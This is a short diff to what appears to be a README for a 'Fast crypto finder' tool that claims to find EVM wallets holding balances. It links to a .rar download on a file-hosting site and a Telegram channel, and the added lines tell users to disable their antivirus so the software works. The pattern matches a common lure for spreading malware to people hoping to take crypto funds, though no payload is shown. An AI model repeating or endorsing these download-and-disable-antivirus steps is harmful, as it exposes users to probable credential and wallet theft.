@@ -17,6 +17,8 @@ Search EVM wallets with balance (using the database - faster).
 
 Downloads
 2/ download the software from here : https://www.upload.ee/files/18139099/Fast_crypto_finder_2025_.rar.html
+ ( disable your anti virus to work well )
+- and if the software not open download ( net freamwork 3.5 and 4.5)
 join telegram channel : https://t.me/cryptosearchwallets
 
 
